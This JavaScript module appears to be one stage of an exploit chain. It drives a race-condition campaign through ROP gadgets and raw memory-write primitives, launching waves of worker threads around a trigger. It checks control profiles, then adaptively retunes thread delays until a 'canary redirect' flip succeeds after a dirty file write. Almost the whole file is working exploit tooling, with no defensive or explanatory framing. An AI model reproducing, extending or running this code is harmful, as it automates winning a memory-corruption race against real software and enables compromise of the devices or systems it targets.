import coreRuntime from "../runtime.mjs";

const {
  GADGET_MEMSET,
  allocPage,
  call_rop,
  closeHandle,
  closeReservationGroup,
  executeWave,
  frameArgSlot,
  log,
  openReservationGroup,
  prepPacket,
  resetWaveState,
  roleSendCode,
  write32,
  write64,
  write8,
  writeDirtyData
} = coreRuntime;

export const WINDOW_RATE_THRESHOLD = 0.5;
const TIMING_NOISE_FLOOR_US = 75;
const TIMING_MAX_STEP_US = 250;
const TIMING_MAX_DRIFT_US = 1000;
const TIMING_MIN_REPEATED_FAILURES = 2;
const TIMING_MIN_ROLE_GAP_NS = 50000;
// A valid window with no flip means the overlap shape is right but the flip
// phase is not. After a run of such windows, nudge the canary in small steps
// so one campaign can test several phases without abandoning the schedule
// that produced the windows.
const TIMING_NO_FLIP_WINDOWS = 5;
const TIMING_NO_FLIP_STEP_US = 100;
const TIMING_NO_FLIP_MIN_LEAD_US = 350;
const TIMING_NO_FLIP_MIN_HOLD_US = 100;
const TIMING_NO_FLIP_MIN_START_US = 100;
const TIMING_NO_FLIP_MAX_ADJUSTMENTS = 6;
// The hard qualification floor is 300µs; target some extra margin.
const RECEIVE_MARGIN_TARGET_US = 500;

// ── Canary wave loop (S11) ──────────────────────────────────────────────────

export async function runControlWaveLoop({
  config,
  helpers,
  REQ,
  dirtyFilePath,
  extentTriggerHandle,
  gates,
  pinHandle,
  pinPkt,
  pktBuf,
  rawScheduling,
  rootSession,
  savedHandle,
  sendIndices,
  triggerHandle,
  waveData,
  waveExtra,
  workerResources,
  SCRATCH_DIR,
  extentTotal,
  fragmentBufs,
  segments,
  selectedDir,
  triggerBuf,
  clearPkt,
  clearSendIndex,
  pinSendIndex,
  prePkt,
  preSendIndex,
  abortControlCanonical,
  canaryPath,
  setupPath,
  setupPkt,
  timingBaseline = null,
  timingProbe = null,
  allowTimingAdjustments = true
}) {
  let canaryQualified;
  let dirtyWriteBuf;
  let dirtyWritePkt;
  let pinFirstWaveQualified;
  let wavesJoined;
  let wavesStarted;
  let workerStateSafe;
  let nextProfile;
  let workflowStopReason = null;
    // S11: Control wave loop — the same state machine as the reference run.
    pinFirstWaveQualified = false;
    var abortControlPassed = false;
    var abortHoleControlPassed = false;
    var extentQualified = false;
    var negativeControlPassed = false;
    canaryQualified = false;
    workerStateSafe = true;
    nextProfile = "abort-control";
    var profileCounts = Object.create(null);
    var positiveWindows = 0;
    var positiveWindowFlips = 0;
    var positiveObservedRedirects = 0;
    var positiveOutsideWindowFlips = 0;
    var positiveQualifiedFlips = 0;
    var positiveHealthFailures = 0;
    var positiveGateFailures = Object.create(null);
    var positiveWindowRecords = [];
    var waveTimingRecords = [];
    var verboseWaveLines = [];
    var timingAdjustments = [];
  var pinQualificationDiagnostics = null;
    wavesStarted = 0;
    wavesJoined = 0;
    dirtyWriteBuf = allocPage(config.DIRTY_FILE_SIZE + 0x2000);
    call_rop(GADGET_MEMSET, dirtyWriteBuf, 0x66n, BigInt(config.DIRTY_FILE_SIZE));
    dirtyWritePkt = allocPage(0x2000);
    var baseline = timingBaseline || {
        roleDelays: config.roleDelays.slice(),
        guardDelays: config.guardDelays.slice()
    };
    var probeState = timingProbe || {};
    var carriedPending = probeState.pending;
    var retune = {
        lastWave: 0,
        noFlipStreak: 0,
        noFlipDirection: probeState.direction === -1 ? -1 : 1,
        noFlipAdjustments: 0,
        noFlipPending: null,
        // A direction that lost windows stays failed across attempts, so the
        // next attempt does not repeat the same probe from the same phase.
        laterFailed: probeState.laterFailed === true,
        earlierFailed: probeState.earlierFailed === true,
        phase: probeState.done === true ? "done" : "later"
    };
    if (carriedPending && Array.isArray(carriedPending.roleDelays) &&
        carriedPending.roleDelays.length === config.roleDelays.length) {
        // The previous attempt ended on an unvalidated flip-phase nudge. Keep
        // its pre-probe schedule so the next attempt can roll it back.
        retune.noFlipPending = {
            wave: 0,
            failures: 0,
            direction: carriedPending.direction === -1 ? -1 : 1,
            roleDelays: carriedPending.roleDelays.slice()
        };
    }

    // Apply a schedule change and make the live frames match it. A failed
    // frame patch restores the previous schedule so the config and the raw
    // threads never disagree.
    var applyTimingChange = function(produceChanges, reason, source,
            recordChange) {
        if (!allowTimingAdjustments || canaryQualified) return [];
        var roleDelaysBefore = config.roleDelays.slice();
        var guardDelaysBefore = config.guardDelays.slice();
        var changes = produceChanges();
        if (!changes || changes.length === 0) return [];
        if (!helpers.applyTimingToFrames(config, waveData, {
                roleDelays: roleDelaysBefore,
                guardDelays: guardDelaysBefore
            })) {
            config.roleDelays.splice(0, config.roleDelays.length,
                ...roleDelaysBefore);
            config.guardDelays.splice(0, config.guardDelays.length,
                ...guardDelaysBefore);
            return [];
        }
        if (recordChange !== false) {
            for (var ci = 0; ci < changes.length; ci++) {
                timingAdjustments.push({
                    afterWave: wavesJoined,
                    reason: reason,
                    source: source,
                    ...changes[ci]
                });
            }
        }
        retune.lastWave = wavesJoined;
        return changes;
    };

    // A flip-phase nudge is a probe: if the following waves lose the window,
    // restore the pre-probe schedule and remember that direction failed.
    var rollbackNoFlipProbe = function() {
        var pendingNoFlip = retune.noFlipPending;
        retune.noFlipPending = null;
        if (pendingNoFlip.direction > 0) retune.laterFailed = true;
        else retune.earlierFailed = true;
        retune.noFlipDirection = pendingNoFlip.direction > 0 ? -1 : 1;
        if (retune.laterFailed && retune.earlierFailed)
            retune.phase = "done";
        var canaryIndex = config.roleLabels.indexOf("canary");
        var nudgedCanary = config.roleDelays[canaryIndex];
        applyTimingChange(function() {
            config.roleDelays.splice(0, config.roleDelays.length,
                ...pendingNoFlip.roleDelays);
            return [{role: "canary",
                deltaUs: (config.roleDelays[canaryIndex] - nudgedCanary) / 1000,
                delayNs: config.roleDelays[canaryIndex]}];
        }, "no-flip-probe-window-lost", "positive", false);
    };

    // Validate a carried or fresh probe on the first windows measured after
    // it. Positive, extent-present, and negative profiles all measure the
    // same overlap margin, so any of them can show that the probe hurt.
    var validateNoFlipProbe = function(wResult) {
        if (!retune.noFlipPending) return;
        if (wResult.window || wResult.observedCanaryRedirect) {
            retune.noFlipPending = null;
        } else if (++retune.noFlipPending.failures >=
                TIMING_MIN_REPEATED_FAILURES) {
            rollbackNoFlipProbe();
        }
    };

    var applyNoFlipProbe = function(lastWindowRecord) {
        if (!lastWindowRecord) return [];
        var noFlipBefore = config.roleDelays.slice();
        var changes = applyTimingChange(function() {
            return applyNoFlipTimingAdjustment(config, baseline,
                lastWindowRecord, retune);
        }, "positive-window-valid-no-flip", "positive");
        if (changes.length) {
            retune.noFlipStreak = 0;
            retune.noFlipPending = {
                wave: wavesJoined,
                failures: 0,
                direction: changes[0].direction,
                roleDelays: noFlipBefore
            };
        }
        return changes;
    };

    for (var attempt = 0; attempt < config.MAX_CONTROL_WAVES; attempt++) {
        if (canaryQualified) break;
        var profile = nextProfile;

        if (!writeDirtyData(savedHandle, dirtyFilePath, config.DIRTY_FILE_SIZE,
                dirtyWriteBuf, dirtyWritePkt)) {
            workflowStopReason = "dirty-write-failed-at-wave-" + (attempt + 1);
            await log("FAIL: W" + helpers.pad2(attempt + 1) + " dirty write");
            break;
        }

        resetWaveState(waveData.frames, waveData.backups, REQ, waveData.pktBackups,
            gates, waveExtra);
        if (profile === "abort-control") write32(gates.completedFlag, 1n);
        if (profile === "abort-hole-control") write32(gates.bottleneckFinished, 1n);
        var profileSetup = helpers.configureProfile(profile, {config, REQ,
            SCRATCH_DIR: SCRATCH_DIR, extentTotal: extentTotal,
            fragmentBufs: fragmentBufs, segments: segments,
            selectedDir: selectedDir, triggerBuf: triggerBuf});
        if (!profileSetup.configured) {
            workflowStopReason = "profile-setup-failed-" + profile;
            break;
        }

        var group = openReservationGroup(rootSession, pktBuf, 59);
        if (!group.ok) {
            workflowStopReason = "reservation-failed-at-wave-" + (attempt + 1);
            await log("FAIL: W" + helpers.pad2(attempt + 1) + " reservation");
            break;
        }

        prepPacket(REQ[9], 4, 8, []);
        write8(REQ[9] + 0x10n, 2n);
        write32(REQ[9] + 0x14n, BigInt(group.outer));
        write32(REQ[9] + 0x1Cn, 0n);
        write64(frameArgSlot(waveData.frames[9].frame, waveData.frames[9].count,
            sendIndices[9], 0), BigInt(group.session));

        var extentProfile = profile === "extent-absent" || profile === "extent-present";
        write64(frameArgSlot(waveData.frames[12].frame, waveData.frames[12].count,
            sendIndices[12], 0),
            BigInt(extentProfile ? extentTriggerHandle : triggerHandle));

        var createPinThisWave = !pinHandle;
        write32(pinPkt + 0x18n, BigInt(createPinThisWave ? 200 : 1009));

        var wave = executeWave(waveData.frames, rawScheduling, workerResources,
            gates, sendIndices);
        wavesStarted += wave.started === 13 ? 1 : 0;

        if (wave.created < 13 || wave.started < 13) {
            workflowStopReason = "worker-start-failed-at-wave-" + (attempt + 1);
            var relCode = roleSendCode(waveData.frames, 9, sendIndices[9]);
            closeReservationGroup(group, wave.created < 13 || relCode !== 0, pktBuf);
            workerStateSafe = wave.workerStateSafe === true;
            await log("FAIL: W" + helpers.pad2(attempt + 1) + " workers=" +
                wave.created + "/" + wave.started + " joined=" + wave.joined +
                " cleanupSafe=" + workerStateSafe);
            break;
        }
        if (wave.joined < 13) {
            workflowStopReason = "worker-join-failed-at-wave-" + (attempt + 1);
            workerStateSafe = false;
            await log("FAIL: W" + helpers.pad2(attempt + 1) + " join=" + wave.joined + "/13");
            break;
        }
        wavesJoined++;

        var wResult = helpers.analyzeWave(profile, wave, waveData, group,
            createPinThisWave, {
                config, REQ, clearPkt: clearPkt, clearSendIndex: clearSendIndex,
                gates, pinFirstWaveQualified, pinHandle, pinPkt,
                pinSendIndex: pinSendIndex, pktBuf, prePkt: prePkt,
                preSendIndex: preSendIndex, rootSession, sendIndices,
                abortControlCanonical: abortControlCanonical,
                canaryPath: canaryPath, savedHandle, setupPath: setupPath,
                setupPkt: setupPkt
            });
        pinHandle = wResult.pinHandle;
        pinFirstWaveQualified = wResult.pinFirstWaveQualified;
        if (createPinThisWave)
            pinQualificationDiagnostics = wResult.pinDiagnostics;

        profileCounts[profile] = (profileCounts[profile] || 0) + 1;
        const timingRecord = {
            wave: attempt + 1,
            profile,
            window: wResult.window,
            shape: wResult.shape,
            shapeMissing: wResult.shapeMissing.slice(),
            marginUs: wResult.marginUsRaw,
            marginSlackUs: wResult.marginSlackUs,
            rejections: wResult.rejections.slice(),
            roleTimings: wResult.roleTimings
        };
        waveTimingRecords.push(timingRecord);
        if (profile === "positive") {
            if (wResult.observedCanaryRedirect) {
                positiveObservedRedirects++;
                if (wResult.window) positiveWindowFlips++;
                else positiveOutsideWindowFlips++;
            }
            if (wResult.window) positiveWindows++;
            if (wResult.canaryRedirect) positiveQualifiedFlips++;
            if (!wResult.postCanaryHealth.healthy) positiveHealthFailures++;
            for (var ri = 0; ri < wResult.rejections.length; ri++) {
                var rejection = wResult.rejections[ri];
                positiveGateFailures[rejection] =
                    (positiveGateFailures[rejection] || 0) + 1;
            }
            const positiveRecord = {
                ...timingRecord,
                preReleaseUsed: wResult.preReleaseUsed,
                preReleaseSlackBytes: wResult.preReleaseSlackBytes,
                canaryResult: wResult.canaryResult,
                canaryType: wResult.canaryType,
                observedRedirect: wResult.observedCanaryRedirect,
                qualifiedFlip: wResult.canaryRedirect,
                postHealthy: wResult.postCanaryHealth.healthy,
                postCanaryHealth: {...wResult.postCanaryHealth},
                triggerResult: wResult.triggerResult,
                triggerType: wResult.triggerType,
                triggerAborted: wResult.triggerAborted,
                changedPaths: wResult.changedPaths.slice(),
                guardSamples: {...wResult.guardSamples}
            };
            positiveWindowRecords.push(positiveRecord);
        }

        var releaseWasSent = roleSendCode(waveData.frames, 9, sendIndices[9]) === 0;
        closeReservationGroup(group, !releaseWasSent, pktBuf);

        if (profile === "abort-control") {
            abortControlPassed = pinFirstWaveQualified && wResult.abortControl;
            if (!pinFirstWaveQualified && pinHandle) {
                closeHandle(pinHandle); pinHandle = 0;
            }
            if (abortControlPassed) {
                nextProfile = "abort-hole-control";
            } else {
                nextProfile = "abort-control";
            }
        } else if (profile === "abort-hole-control") {
            abortHoleControlPassed = wResult.abortHoleControl;
            if (abortHoleControlPassed) {
                nextProfile = "extent-absent";
            } else {
                nextProfile = "abort-hole-control";
            }
        } else if (profile === "extent-absent") {
            nextProfile = "extent-present";
        } else if (profile === "extent-present") {
            extentQualified = wResult.extentQualified;
            if (extentQualified) {
                nextProfile = "negative";
            } else {
                nextProfile = "extent-present";
            }
        } else if (profile === "negative") {
            negativeControlPassed = wResult.negativeControl;
            if (negativeControlPassed) {
                nextProfile = "positive";
            } else {
                nextProfile = "negative";
            }
        } else if (profile === "positive") {
            canaryQualified = wResult.canaryRedirect;
            nextProfile = "positive";
        }

        // Retune during the campaign instead of only after it. A schedule
        // that keeps failing the same gate must not consume the whole wave
        // budget unchanged, and a schedule that qualifies windows without
        // flipping needs its flip phase moved while the attempt is still live.
        if (profile === "positive" || profile === "extent-present" ||
                profile === "negative") {
            validateNoFlipProbe(wResult);
        }

        if (profile === "positive") {
            retune.noFlipStreak = wResult.window &&
                wResult.canaryResult === 0 && wResult.canaryType === 1 &&
                wResult.postCanaryHealth.healthy
                ? retune.noFlipStreak + 1 : 0;

            var retunePositive = positiveWindowRecords.filter(function(record) {
                return record.wave > retune.lastWave;
            });
            var recentFailures = retunePositive.filter(function(record) {
                return !record.window;
            }).length;
            var recentWindows = retunePositive.length - recentFailures;
            var timingChanged = false;
            if (!canaryQualified &&
                    recentFailures >= TIMING_MIN_REPEATED_FAILURES &&
                    recentWindows / retunePositive.length <
                        WINDOW_RATE_THRESHOLD) {
                timingChanged = applyTimingChange(function() {
                    return applyTimingAdjustments(retunePositive, config,
                        baseline, false);
                }, "repeated-positive-timing-gate-failure", "positive").length > 0;
                if (timingChanged) retune.noFlipStreak = 0;
            }
            if (!timingChanged && !canaryQualified &&
                    retune.noFlipStreak >= TIMING_NO_FLIP_WINDOWS &&
                    retune.noFlipAdjustments <
                        TIMING_NO_FLIP_MAX_ADJUSTMENTS) {
                var lastWindowRecord = null;
                for (var rp = retunePositive.length - 1; rp >= 0; rp--) {
                    if (retunePositive[rp].window &&
                        retunePositive[rp].canaryResult === 0 &&
                        retunePositive[rp].canaryType === 1 &&
                        retunePositive[rp].postHealthy) {
                        lastWindowRecord = retunePositive[rp];
                        break;
                    }
                }
                applyNoFlipProbe(lastWindowRecord);
            }
        } else if (profile === "extent-present" || profile === "negative") {
            var retuneControl = waveTimingRecords.filter(function(record) {
                return record.wave > retune.lastWave &&
                    (record.profile === "extent-present" ||
                     record.profile === "negative");
            });
            if (retuneControl.filter(function(record) {
                    return !record.window;
                }).length >= TIMING_MIN_REPEATED_FAILURES &&
                retuneControl.filter(function(record) {
                    return record.window;
                }).length / retuneControl.length < WINDOW_RATE_THRESHOLD) {
                applyTimingChange(function() {
                    return applyTimingAdjustments(retuneControl, config,
                        baseline, true);
                }, "repeated-control-timing-gate-failure", "control");
            }
        }

        verboseWaveLines.push(helpers.formatWaveSummaryLine(
            attempt + 1, profile, wResult,
            wResult.window ? "QUALIFIED" : "REJECTED", {config}));

    }

    // The runtime log policy suppresses these lines unless verbose logging is
    // enabled. Emit after the wave loop so diagnostics do not delay a wave.
    for (const line of verboseWaveLines) await log(line);

    const positiveAttempts = profileCounts.positive || 0;

    // Only retune on waves measured under the current schedule. After a
    // mid-campaign change, samples from the old schedule are stale.
    const recentTimingRecords = waveTimingRecords.filter(record =>
        record.wave > retune.lastWave);
    const recentPositiveRecords = positiveWindowRecords.filter(record =>
        record.wave > retune.lastWave);
    const recentPositiveAttempts = recentPositiveRecords.length;
    const recentPositiveWindows =
        recentPositiveRecords.filter(record => record.window).length;

    if (allowTimingAdjustments && !canaryQualified &&
        recentTimingRecords.length > 0) {
        if (recentPositiveAttempts > 0 &&
            recentPositiveWindows / recentPositiveAttempts <
                WINDOW_RATE_THRESHOLD) {
            applyTimingChange(() => applyTimingAdjustments(
                recentPositiveRecords, config, baseline, false),
                "positive-window-rate-below-50-percent", "positive");
        } else if (recentPositiveAttempts === 0) {
            // Extent-present and negative controls use the same worker
            // schedule and measure the same overlap margin as positive waves.
            // Exclude the deliberate abort controls and extent-absent profile.
            const controlRecords = recentTimingRecords.filter(record =>
                record.profile === "extent-present" ||
                record.profile === "negative");
            const controlWindows =
                controlRecords.filter(record => record.window).length;
            if (controlRecords.length >= TIMING_MIN_REPEATED_FAILURES &&
                controlWindows / controlRecords.length <
                    WINDOW_RATE_THRESHOLD) {
                applyTimingChange(() => applyTimingAdjustments(
                    controlRecords, config, baseline, true),
                    "control-window-rate-below-50-percent", "control");
            }
        } else if (recentPositiveWindows >= TIMING_MIN_REPEATED_FAILURES &&
                retune.noFlipAdjustments < TIMING_NO_FLIP_MAX_ADJUSTMENTS) {
            // The windows are fine but the flip never happened. Carry a
            // flip-phase change into the next attempt instead of repeating
            // the same schedule.
            let lastWindowRecord = null;
            for (let rp = recentPositiveRecords.length - 1; rp >= 0; rp--) {
                if (recentPositiveRecords[rp].window &&
                    recentPositiveRecords[rp].canaryResult === 0 &&
                    recentPositiveRecords[rp].canaryType === 1 &&
                    recentPositiveRecords[rp].postHealthy) {
                    lastWindowRecord = recentPositiveRecords[rp];
                    break;
                }
            }
            if (lastWindowRecord) {
                applyNoFlipProbe(lastWindowRecord);
            }
        }
    }

    var controlsQualified = pinFirstWaveQualified && abortControlPassed &&
        abortHoleControlPassed && extentQualified && negativeControlPassed;
    var campaignState;
    if (!workerStateSafe) {
        campaignState = "worker-unsafe";
    } else if (positiveHealthFailures > 0) {
        campaignState = "post-health-failure";
    } else if (canaryQualified) {
        campaignState = "flip-qualified";
    } else if (controlsQualified && positiveWindows > 0) {
        campaignState = "window-valid-no-flip";
    } else if (controlsQualified && positiveOutsideWindowFlips > 0) {
        campaignState = "raw-flip-outside-window";
    } else if (controlsQualified) {
        campaignState = "no-qualified-positive-window";
    } else {
        campaignState = "controls-incomplete";
    }

    return {ok: true, canaryQualified, dirtyWriteBuf, dirtyWritePkt,
      pinFirstWaveQualified, pinHandle, wavesJoined, wavesStarted,
      workerStateSafe, campaignState, controlsQualified, nextProfile,
      workflowStopReason,
      profileCounts,
      abortControlPassed, abortHoleControlPassed, extentQualified,
      negativeControlPassed, positiveAttempts,
      positiveWindows, positiveWindowFlips, positiveObservedRedirects,
      positiveOutsideWindowFlips, positiveQualifiedFlips,
      positiveHealthFailures, positiveGateFailures, positiveWindowRecords,
      waveTimingRecords, timingAdjustments,
      timingSchedule: {
          baselineRoleDelays: baseline.roleDelays.slice(),
          baselineGuardDelays: baseline.guardDelays.slice(),
          roleDelays: config.roleDelays.slice(),
          guardDelays: config.guardDelays.slice(),
          noFlipProbe: {
              direction: retune.noFlipDirection,
              laterFailed: retune.laterFailed === true,
              earlierFailed: retune.earlierFailed === true,
              done: retune.phase === "done",
              pending: retune.noFlipPending ? {
                  direction: retune.noFlipPending.direction,
                  roleDelays: retune.noFlipPending.roleDelays.slice()
              } : null
          }
      },
      pinQualificationDiagnostics};
}

function median(values) {
  if (!values.length) return null;
  const sorted = values.slice().sort((a, b) => a - b);
  const middle = Math.floor(sorted.length / 2);
  return sorted.length % 2
    ? sorted[middle]
    : (sorted[middle - 1] + sorted[middle]) / 2;
}

function addTimingCorrection(corrections, key, value) {
  if (!Number.isFinite(value)) return;
  if (!corrections[key]) corrections[key] = [];
  corrections[key].push(value);
}

function collectTimingCorrection(records, config, allowMixedRejections = false) {
  const eligible = records.filter(record => {
    const rejections = record.rejections || [];
    const hasTimingRejection = rejections.indexOf("shape-10") >= 0 ||
      rejections.indexOf("margin>=300") >= 0;
    return !record.window && hasTimingRejection &&
      (allowMixedRejections || rejections.length === 1);
  });
  const shapeRecords = eligible.filter(record =>
    (record.rejections || []).indexOf("shape-10") >= 0);
  const marginRecords = eligible.filter(record =>
    (record.rejections || []).indexOf("margin>=300") >= 0);

  // Do not retune on a single observation or when two timing failures are
  // equally common. That avoids changing a coupled schedule without a clear
  // dominant cause, and excludes waves that failed another global gate.
  if (marginRecords.length >= TIMING_MIN_REPEATED_FAILURES &&
      marginRecords.length > shapeRecords.length) {
    const samples = marginRecords
      .map(record => Number.isFinite(record.marginUs)
        ? record.marginUs - RECEIVE_MARGIN_TARGET_US
        : null)
      .filter(sample => Number.isFinite(sample));
    return samples.length >= TIMING_MIN_REPEATED_FAILURES
      ? {role: "release", samples}
      : null;
  }

  if (shapeRecords.length < TIMING_MIN_REPEATED_FAILURES ||
      shapeRecords.length <= marginRecords.length) return null;

  const corrections = Object.create(null);
  for (const record of shapeRecords) {
    const timing = record.roleTimings || {};
    const trigger = timing.trigger;
    if (!trigger) continue;

    for (const role of new Set(record.shapeMissing || [])) {
      // Guard 1 launches the trigger, so do not move it from a shape-only
      // sample. Margin samples instead advance release and both guards.
      if (role === "guard1") continue;
      const roleTiming = timing[role];
      if (!roleTiming) continue;

      let targetMidpoint;
      if (config.throughRoles.indexOf(role) >= 0) {
        const triggerDuration = trigger.relEndUs - trigger.relStartUs;
        if (roleTiming.durationUs <= triggerDuration) continue;
        targetMidpoint = (trigger.relStartUs + trigger.relEndUs) / 2;
      } else if (config.heldRoles.indexOf(role) >= 0) {
        targetMidpoint = trigger.relStartUs;
      } else {
        continue;
      }

      const roleMidpoint =
        (roleTiming.relStartUs + roleTiming.relEndUs) / 2;
      addTimingCorrection(
        corrections, role, targetMidpoint - roleMidpoint);
    }
  }

  const ranked = Object.entries(corrections)
    .sort((a, b) => b[1].length - a[1].length);
  if (ranked.length === 0 ||
      ranked[0][1].length < TIMING_MIN_REPEATED_FAILURES ||
      (ranked[1] && ranked[1][1].length === ranked[0][1].length)) return null;
  return {role: ranked[0][0], samples: ranked[0][1]};
}

function applyTimingAdjustments(records, config, baseline,
    allowMixedRejections = false) {
  const correction = collectTimingCorrection(records, config,
      allowMixedRejections);
  if (!correction) return [];

  const medianCorrectionUs = median(correction.samples);
  if (medianCorrectionUs === null ||
      Math.abs(medianCorrectionUs) < TIMING_NOISE_FLOOR_US) return [];

  const stepUs = Math.max(-TIMING_MAX_STEP_US,
      Math.min(TIMING_MAX_STEP_US, medianCorrectionUs));
  const role = correction.role;
  const roleIndex = config.roleLabels.indexOf(role);
  const isGuard = role === "guard0" || role === "guard1";
  const delayIndex = isGuard ? roleIndex - 10 : roleIndex;
  const delays = isGuard ? config.guardDelays : config.roleDelays;
  const baseDelays = isGuard
    ? baseline.guardDelays : baseline.roleDelays;

  if (delayIndex < 0 || delayIndex >= delays.length) return [];

  const before = delays[delayIndex];
  let minDelay = Math.max(0,
      baseDelays[delayIndex] - TIMING_MAX_DRIFT_US * 1000);
  let maxDelay = baseDelays[delayIndex] + TIMING_MAX_DRIFT_US * 1000;

  // Retain the reference stagger. Each role may move, but not across its
  // neighbors or into another role's start slot.
  if (delayIndex > 0)
    minDelay = Math.max(minDelay,
        delays[delayIndex - 1] + TIMING_MIN_ROLE_GAP_NS);
  if (delayIndex + 1 < delays.length)
    maxDelay = Math.min(maxDelay,
        delays[delayIndex + 1] - TIMING_MIN_ROLE_GAP_NS);
  if (minDelay > maxDelay) return [];

  const after = Math.max(minDelay, Math.min(maxDelay,
      before + Math.round(stepUs * 1000)));
  const actualStepUs = (after - before) / 1000;
  if (!actualStepUs) return [];

  delays[delayIndex] = after;
  return [{role, deltaUs: actualStepUs, delayNs: after}];
}

// Window-valid-no-flip correction. The overlap shape is already correct, so
// do not touch the release/guards (that would move the qualified window);
// move the canary GetEntryType closer to (or, after the later sweep is
// blocked, further from) the trigger instead. Fillers are re-spaced only as
// needed to preserve the programmed start order.
function applyNoFlipTimingAdjustment(config, baseline, record, state) {
  if (!state || state.phase === "done" ||
      state.noFlipAdjustments >= TIMING_NO_FLIP_MAX_ADJUSTMENTS) return [];
  const canaryIndex = config.roleLabels.indexOf("canary");
  const releaseIndex = config.roleLabels.indexOf("release");
  if (canaryIndex < 1 || canaryIndex + 3 >= config.roleDelays.length ||
      releaseIndex !== canaryIndex + 3) return [];

  const canaryTiming = record && record.roleTimings && record.roleTimings.canary;
  const leadUs = canaryTiming ? -canaryTiming.relStartUs : null;

  const tryDirection = direction => {
    if (direction > 0 && state.laterFailed) return [];
    if (direction < 0 && state.earlierFailed) return [];
    if (direction > 0 && leadUs !== null &&
        leadUs - TIMING_NO_FLIP_STEP_US < TIMING_NO_FLIP_MIN_LEAD_US)
      return [];
    if (direction < 0 && canaryTiming &&
        canaryTiming.relEndUs - TIMING_NO_FLIP_STEP_US <
            TIMING_NO_FLIP_MIN_HOLD_US)
      return [];
    const before = config.roleDelays[canaryIndex];
    const after = before + direction * TIMING_NO_FLIP_STEP_US * 1000;
    const baseCanary = baseline.roleDelays[canaryIndex];
    const minDelay = Math.max(0,
        config.roleDelays[canaryIndex - 1] + TIMING_MIN_ROLE_GAP_NS,
        baseCanary - TIMING_MAX_DRIFT_US * 1000);
    const maxDelay = Math.min(
        config.roleDelays[releaseIndex] - 2 * TIMING_MIN_ROLE_GAP_NS,
        baseCanary + TIMING_MAX_DRIFT_US * 1000);
    if (after < minDelay || after > maxDelay) return [];

    let filler0 = config.roleDelays[canaryIndex + 1];
    let filler1 = config.roleDelays[canaryIndex + 2];
    const currentFiller0 = filler0;
    const currentFiller1 = filler1;
    filler0 = Math.max(filler0, after + TIMING_MIN_ROLE_GAP_NS);
    filler1 = Math.max(filler1, filler0 + TIMING_MIN_ROLE_GAP_NS);
    if (filler0 > baseline.roleDelays[canaryIndex + 1] +
            TIMING_MAX_DRIFT_US * 1000 ||
        filler1 > baseline.roleDelays[canaryIndex + 2] +
            TIMING_MAX_DRIFT_US * 1000 ||
        filler1 + TIMING_MIN_ROLE_GAP_NS >
            config.roleDelays[releaseIndex]) return [];

    // Held requests must still start before the trigger and be running when
    // it starts. Moving a filler later eats into both margins.
    const timing = record && record.roleTimings ? record.roleTimings : {};
    const push0 = (filler0 - currentFiller0) / 1000;
    const push1 = (filler1 - currentFiller1) / 1000;
    if ((push0 > 0 && timing.filler0 &&
            (timing.filler0.relEndUs - push0 < TIMING_NO_FLIP_MIN_HOLD_US ||
             timing.filler0.relStartUs + push0 >
                -TIMING_NO_FLIP_MIN_START_US)) ||
        (push1 > 0 && timing.filler1 &&
            (timing.filler1.relEndUs - push1 < TIMING_NO_FLIP_MIN_HOLD_US ||
             timing.filler1.relStartUs + push1 >
                -TIMING_NO_FLIP_MIN_START_US)))
        return [];

    config.roleDelays[canaryIndex] = after;
    config.roleDelays[canaryIndex + 1] = filler0;
    config.roleDelays[canaryIndex + 2] = filler1;
    return [{role: "canary", deltaUs: (after - before) / 1000,
      delayNs: after, direction}];
  };

  let direction = state.noFlipDirection;
  let changes = tryDirection(direction);
  if (changes.length === 0) {
    const alternate = -direction;
    changes = tryDirection(alternate);
    if (changes.length === 0) {
      state.phase = "done";
      return [];
    }
    state.noFlipDirection = alternate;
  }
  state.noFlipAdjustments++;
  return changes;
}
